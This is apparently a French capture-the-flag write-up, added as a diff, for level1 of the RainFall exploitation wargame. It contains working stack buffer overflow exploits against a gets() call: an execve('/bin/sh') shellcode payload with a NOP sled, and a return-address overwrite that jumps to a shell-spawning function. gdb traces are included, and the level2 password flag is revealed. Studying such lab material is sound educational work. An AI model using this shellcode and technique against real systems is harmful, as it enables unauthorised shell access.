@@ -1,0 +1,113 @@
+Approche shellcode:
+
+en discuter apres l'approche run pour la partie theorique
+
+level1@RainFall:~$ ltrace ./level1
+__libc_start_main(0x8048480, 1, 0xbffff7a4, 0x80484a0, 0x8048510 <unfinished ...>
+gets(0xbffff6c0, 47, 0xbffff70c, 0xb7fd0ff4, 0x80484a0)        = 0xbffff6c0
+
+python -c 'print("\x90" * 32 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "a" * 8 + "\xc0\xf6\xff\xbf" * 4)' > /tmp/test
+
+level1@RainFall:~$ xxd /tmp/test
+0000000: 9090 9090 9090 9090 9090 9090 9090 9090  ................
+0000010: 9090 9090 9090 9090 9090 9090 9090 9090  ................
+0000020: 31c0 9950 682f 2f73 6868 2f62 696e 89e3  1..Ph//shh/bin..
+0000030: 5053 89e1 b00b cd80 6161 6161 6161 6161  PS......aaaaaaaa
+0000040: c0f6 ffbf c0f6 ffbf c0f6 ffbf c0f6 ffbf  ................
+0000050: 0a
+
+level1@RainFall:~$ cat /tmp/test /dev/stdin | ./level1
+whoami
+level2
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+
+Approche redirection run:
+
+level1@RainFall:~$ gdb ./level1
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+	...
+
+(gdb) i function
+All defined functions:
+	...
+0x08048444  run
+0x08048480  main
+
+La fonction main alloue 80 octets separe en deux variable
+
+   0x08048486 <+6>:	sub    esp,0x50
+   0x08048489 <+9>:	lea    eax,[esp+0x10]
+
+dont une qui sera utilisee avec la fonction gets, qui a elle seule ne protege pas de buffer overflow - (explication detaillee en vocal)
+
+   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
+   0x08048490 <+16>:	call   0x8048340 <gets@plt>
+
+Nous allons donc l'exploiter a l'aide de la fonction run qui execute un shell avec la commande system.
+
+   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
+   0x08048479 <+53>:	call   0x8048360 <system@plt>
+
+(gdb) x/s 0x8048584
+0x8048584:	 "/bin/sh"
+
+Pour se faire il suffit de reecrire l'adresse de retour de la fonction main a l'aide d'un buffer overflow avec celle de la fonction run.
+08048444 <run>: ...
+J'envoi cela a gets par le biais d'une commande qui ouvre stdin a un fichier cree dans tmp:
+level1@RainFall:~$ xxd /tmp/exploit
+0000000: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+0000010: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+0000020: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+0000030: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+0000040: 6161 6161 6161 6161 6161 6161 4484 0408  aaaaaaaaaaaaD...
+0000050: 0a
+l'adresse est en little-endian 32-bit
+
+(gdb) r < /tmp/exploit /dev/stdin
+Starting program: /home/user/level1/level1 < /tmp/exploit /dev/stdin
+
+La stack apres gets:
+(gdb) x/32x $esp
+0xbffff680:	0xbffff690	0x0000002f	0xbffff6dc	0xb7fd0ff4
+0xbffff690:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbffff6a0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbffff6b0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbffff6c0:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbffff6d0:	0x61616161	0x61616161	0x61616161	0x08048444
+0xbffff6e0:	0x00000000	0xbffff774	0xbffff780	0xb7fdc858
+0xbffff6f0:	0x00000000	0xbffff71c	0xbffff780	0x00000000
+
+(gdb) ni
+0x08048496 in main ()
+1: x/5i $pc
+=> 0x8048496 <main+22>:	ret
+   0x8048497:	nop
+   0x8048498:	nop
+   0x8048499:	nop
+   0x804849a:	nop
+(gdb)
+0x08048444 in run ()
+1: x/5i $pc
+=> 0x8048444 <run>:	push   ebp
+   0x8048445 <run+1>:	mov    ebp,esp
+   0x8048447 <run+3>:	sub    esp,0x18
+   0x804844a <run+6>:	mov    eax,ds:0x80497c0
+   0x804844f <run+11>:	mov    edx,eax
+
+Nous sommes bien dans la fonction run.
+
+level1@RainFall:~$ cat /tmp/exploit /dev/stdin | ./level1
+Good... Wait what?
+whoami
+level2
+pwd
+/home/user/level1
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+^CSegmentation fault (core dumped)
+
+level1@RainFall:~$ su level2
+Password:
+Done.
